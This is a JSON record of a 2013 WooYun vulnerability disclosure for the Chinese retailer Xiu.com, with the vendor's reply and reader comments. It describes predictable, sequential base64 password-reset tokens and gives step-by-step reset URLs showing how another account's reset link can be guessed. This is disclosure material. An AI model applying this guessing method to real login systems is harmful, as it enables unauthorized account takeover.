{"id": 12877, "wybug_id": "wooyun-2013-020789", "wybug_title": "走秀网你家账户密码又能任意重置啦！(人工猜解)", "wybug_corp": "走秀网", "wybug_author": "流星", "wybug_date": "2013-03-28 00:09", "wybug_open_date": "2013-05-12 00:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当导致攻击界面扩大", "认证缺陷", "盲目信任用户数据", "认证设计不合理", "加密算法设计错误", "算法破解", "逆向破解思路", "任意密码修改"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-12：\t细节向公众公开  简要描述： 好吧，标题党了... 详细说明：  首先注册两账户，然后用邮箱找回密码：http://login.xiu.com/resetpwd?sn=MzQyMDQwMg==&userId=A  邮件发送时间：21:32:12http://login.xiu.com/resetpwd?sn=MzQyMDQwMw==&userId=B  邮件发送时间：21:32:54\n\n\n\nhttp://login.xiu.com/resetpwd?sn=MzQyMDQwNQ==&userId=A  邮件发送时间：21:38:33http://login.xiu.com/resetpwd?sn=MzQyMDQwNg==&userId=B  邮件发送时间：21:39:39\n\n\n\n观察这4个链接http://login.xiu.com/resetpwd?sn=MzQyMDQwMg==&userId=A  21:32:12http://login.xiu.com/resetpwd?sn=MzQyMDQwMw==&userId=B  21:32:54http://login.xiu.com/resetpwd?sn=MzQyMDQwNQ==&userId=A  21:38:33http://login.xiu.com/resetpwd?sn=MzQyMDQwNg==&userId=B  21:39:39发现两个账户密码重置链接中的SN有问题，经测试发现两个账户在一分钟左右的时间内分别发送重置密码的链接，他们的sn只差最后一位。考虑用burp爆破最后一位字符，但是发现就是爆出来sn也使用不了，链接点击一次后就失效了。那就剩下人工猜解了，无奈请求重置次数太多，账户A、B得24小时候才能再次发送密码重置邮件，继续注册两个账户C和账户D在短时间内分别请求账户C和账户D的邮件找回密码请求。得到账户C的密码重置链接http://login.xiu.com/resetpwd?sn=MzQyMDQyMg==&userId=账户C 22:12:29\n\nhttp://login.xiu.com/resetpwd?sn=MzQyMDQyM*==&userId=账户C换成账户D，sn最后一位采用人工猜解的方式进行，先从MzQyMDQyMh开始吧http://login.xiu.com/resetpwd?sn=MzQyMDQyMh==&userId=账户D\n\nhttp://login.xiu.com/resetpwd?sn=MzQyMDQyMi==&userId=账户D\n\nhttp://login.xiu.com/resetpwd?sn=MzQyMDQyMj==&userId=账户D\n\n........http://login.xiu.com/resetpwd?sn=MzQyMDQyMw==&userId=账户D.W的时候成功了\n\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  动态验证码存在一定的脆弱性，像上例最后一位为大写或小写字符的情况，人工猜解的话猜解64次就可以重置一个密码了，看前面的大牛说通过uid找不到用户名，我也就没进一步测试。求人品,求rank...   版权声明：转载请注明来源 流星@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-03-28 10:27 厂商回复： 谢谢对走秀网安全的关注，因不能猜解到用户名，而且有重置次数限制，所以对普通用户的账户安全可以忽略。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-28 00:13 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  人工猜解?    \n     2013-04-27 13:49 |    \t\t小弟 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 楼主好人！下辈子美利坚...)\t\t \n  愣是没看明白。。    \n     2013-05-12 08:21 |    \t\t江苏卫视(乌云厂商)\t\t \n  被雷劈了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}